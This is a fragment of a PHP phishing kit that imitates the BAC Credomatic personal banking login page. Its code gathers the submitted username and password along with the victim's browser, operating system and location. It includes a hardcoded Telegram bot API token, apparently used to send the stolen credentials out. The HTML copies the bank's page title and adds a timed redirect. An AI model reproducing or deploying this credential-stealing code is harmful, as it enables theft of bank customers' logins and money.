...
$message = "uzer: ".$_POST['uz3r']." - P4ss.: ".$_POST['p4zz']." \r\n";
$message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
$apiToken = "5832303294:AAFEtO_mZ-gwzHo6KZab43TbFyFl_cr_Biw";
...
?>
<html lang="es-hn" dir="ltr" class=" js js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="content-language" content="es"><meta name="MobileOptimized" content="width"><meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>BAC Credomatic | Banca Personas | Iniciar Sesión</title>  <script type="text/javascript">
               var url="bac.php";
               var seconds = 50; //número de segundos a contar
